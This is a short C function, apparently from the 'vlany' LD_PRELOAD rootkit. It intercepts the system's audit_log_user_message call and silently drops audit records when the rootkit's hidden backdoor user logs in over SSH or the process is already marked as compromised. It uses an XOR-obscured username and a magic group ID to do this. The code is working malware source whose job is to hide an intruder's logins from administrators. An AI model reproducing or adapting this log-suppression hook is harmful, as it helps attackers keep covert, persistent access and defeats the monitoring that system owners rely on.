int audit_log_user_message(int audit_fd, int type, const char *message, const char *hostname, const char *addr, const char *tty, int result)
{
    #ifdef DEBUG
        printf("[vlany] audit_log_user_message() called\n");
    #endif

    if(!old_alum) old_alum = get_symbol(RTLD_NEXT, CAUDIT_LOG_USER_MESSAGE);

    char sshd_str[40], *vlany_user = strdup(VLANY_USER);
    xor(vlany_user);
    snprintf(sshd_str, sizeof(sshd_str), "sshd: %s", vlany_user);
    cleanup(vlany_user, strlen(vlany_user));

    if(strstr(procname_self(), sshd_str) || owned())
    {
        setgid(MAGIC_GID);
        return 0;
    }

    return old_alum(audit_fd, type, message, hostname, addr, tty, result);
}
